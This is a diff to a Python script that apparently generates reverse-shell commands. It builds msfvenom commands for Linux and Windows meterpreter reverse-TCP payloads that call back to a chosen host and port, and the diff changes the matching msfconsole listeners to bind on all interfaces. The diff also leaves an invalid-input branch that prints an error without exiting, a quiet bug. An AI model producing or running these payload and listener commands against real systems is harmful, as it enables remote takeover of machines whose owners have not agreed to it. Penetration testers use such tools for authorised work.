@@ -44,10 +44,6 @@ def get_ip(ip_iface: str) -> str:
         return ip_iface
 
     # Get ip address from interface
-    if sys.platform != "linux":
-        print("Inteface only supported on Linux", file=sys.stderr)
-        sys.exit(1)
-
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         ip_iface = socket.inet_ntoa(
@@ -57,8 +53,19 @@ def get_ip(ip_iface: str) -> str:
                 pack('256s', ip_iface[:15].encode()))[20:24])
         return ip_iface
     except Exception as e:
-        print(e, file=sys.stderr)
+        pass
+
+    # Check if valid domain
+    if re.match(r"^((?!-)[A-Za-z0-9-]" + "{1,63}(?<!-)\\.)" + "+[A-Za-z]{2,6}", ip_iface):
+        return ip_iface
+
+    # If all checks fail, check if non-linux user using interface
+    if sys.platform != "linux":
+        print("Inteface only supported on Linux", file=sys.stderr)
         sys.exit(1)
+
+    # If is linux, it is invalid input
+    print("Invalid interface or domain", file=sys.stderr)
 
 
 def get_shell(ipaddr: str, port: int) -> dict:
@@ -125,8 +132,8 @@ def get_shell(ipaddr: str, port: int) -> dict:
         'msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
         (ipaddr, port),
         "listen":
-        'msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set lhost %s; set lport %d; exploit"'
-        % (ipaddr, port)
+        'msfconsole -q -x "use multi/handler; set payload linux/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
+        % (port)
     }
 
     linux32_meterpreter = {
@@ -136,8 +143,8 @@ def get_shell(ipaddr: str, port: int) -> dict:
         'msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f elf -o reverse.elf' %
         (ipaddr, port),
         "listen":
-        'msfconsole -q -x "use multi/handler; set payload linux/x86/meterpreter_reverse_tcp; set lhost %s; set lport %d; exploit"'
-        % (ipaddr, port)
+        'msfconsole -q -x "use multi/handler; set payload linux/x86/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
+        % (port)
     }
 
     netcat = {
@@ -322,8 +329,8 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
         (ipaddr, port),
         "listen":
-        'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost %s; set lport %d; exploit"'
-        % (ipaddr, port),
+        'msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
+        % (port),
     }
 
     windows32_meterpreter = {
@@ -333,8 +340,8 @@ def get_shell(ipaddr: str, port: int) -> dict:
         "msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=%s LPORT=%d -f exe -o reverse.exe" %
         (ipaddr, port),
         "listen":
-        'msfconsole -q -x "use multi/handler; set payload windows/x86/meterpreter_reverse_tcp; set lhost %s; set lport %d; exploit"'
-        % (ipaddr, port),
+        'msfconsole -q -x "use multi/handler; set payload windows/x86/meterpreter_reverse_tcp; set LHOST 0.0.0.0; set LPORT %d; exploit"'
+        % (port),
     }
 
     shells = {
